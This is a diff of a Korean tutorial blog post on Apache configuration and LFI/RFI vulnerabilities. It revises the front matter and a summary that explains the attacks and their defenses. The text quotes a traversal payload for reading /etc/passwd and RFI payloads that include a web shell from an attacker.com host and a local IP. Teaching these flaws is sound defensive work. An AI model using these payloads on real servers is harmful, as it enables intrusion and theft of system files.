@@ -1,14 +1,12 @@
 ---
-title: "Apache 설정과 웹 취약점 (LFI/RFI)"
-excerpt: ".."
-
-categories: [network, web]
-tags: [web, security, apache, virtualhost, lfi, rfi, 정보보안]
+title: "웹 보안 Part 3 - Apache 설정과 웹 취약점 (LFI/RFI)"
+excerpt: "Apache Virtual Host 설정, Directory 접근 제어, robots.txt 크롤링 제어, LFI과 Remote File Inclusion(RFI) 취약점 원리와 방어 기법"
+categories: ['sk', 'web']
 typora-root-url: ../../
-
-date: 2025-11-25
-last_modified_at: 2025-11-25
 published: true
+date: 2025-11-25
+last_modified_at: 2025-12-03
+tags: [web, security, apache, virtualhost, lfi, rfi, directory-traversal, webshell, robots-txt, htaccess]
 ---
 
 ## 개요
@@ -428,4 +426,16 @@ localhost?page=http://192.168.10.128/mal.php
 
 ## 마무리
 
-Apache 웹 서버의 올바른 설정과 Virtual Host 구성, robots.txt를 통한 크롤링 제어는 웹 보안의 기본입니다. LFI와 RFI 취약점은 사용자 입력 검증의 중요성을 보여주며, 이러한 취약점을 방지하기 위해서는 철저한 입력 검증과 서버 설정의 안전성 확보가 필수적입니다.
+이번 Part 3에서는 **Apache 웹 서버 설정과 파일 인클루전 취약점**을 종합적으로 학습했습니다. **Apache Virtual Host** 설정을 통해 하나의 서버에서 여러 도메인을 운영할 수 있으며, IP 기반과 이름 기반(Name-based) Virtual Host의 차이를 이해했습니다. httpd.conf와 httpd-vhosts.conf 파일에서 DocumentRoot, ServerName, ServerAlias를 정의하여 각 호스트별로 독립적인 웹 루트 디렉토리를 설정합니다.
+
+**Directory 접근 제어**를 통해 특정 디렉토리의 접근 권한을 세밀하게 관리할 수 있습니다. `<Directory>` 지시자는 물리적 경로, `<Location>` 지시자는 URL 경로를 제어하며, `Options` 지시자(Indexes, FollowSymLinks, ExecCGI)와 `AllowOverride` 설정으로 디렉토리별 동작을 정의합니다. .htaccess 파일은 디렉토리 단위 설정을 가능하게 하지만 성능상 권장되지 않습니다.
+
+**robots.txt**는 검색 엔진 크롤러의 접근을 제어하는 파일입니다. User-agent로 크롤러를 지정하고, Disallow로 접근 금지 경로를 명시하여 민감한 디렉토리(/admin, /backup)를 숨길 수 있습니다. 하지만 robots.txt는 권고 사항일 뿐 강제성이 없으므로, 진짜 보안이 필요한 경로는 인증과 권한 설정이 필수입니다.
+
+**LFI**(Local File Inclusion) 취약점은 사용자 입력을 통해 서버의 로컬 파일을 포함시키는 공격입니다. `include($_GET['page'])`와 같은 코드에서 `page=../../etc/passwd`로 디렉토리 트래버설 공격을 수행하여 시스템 파일을 읽을 수 있습니다. 방어를 위해서는 화이트리스트 검증, basename() 함수 사용, realpath() 경로 정규화, 파일 확장자 제한이 필요합니다.
+
+**RFI**(Remote File Inclusion) 취약점은 원격 서버의 파일을 포함시키는 공격입니다. `allow_url_include` 설정이 활성화된 경우 `page=http://attacker.com/mal.php`로 웹쉘을 실행하여 서버를 완전히 장악할 수 있습니다. 방어를 위해서는 php.ini에서 `allow_url_include = Off` 설정이 필수이며, 사용자 입력을 절대 파일 경로에 직접 사용하지 말아야 합니다.
+
+웹 보안 Part 1~3을 마무리하며, HTTP 프로토콜 기초부터 보안 헤더, 쿠키/세션 관리, SSL/TLS 암호화, Apache 서버 설정, 파일 인클루전 취약점까지 **웹 애플리케이션 보안의 기본 원리**를 모두 학습했습니다. 
+
+---
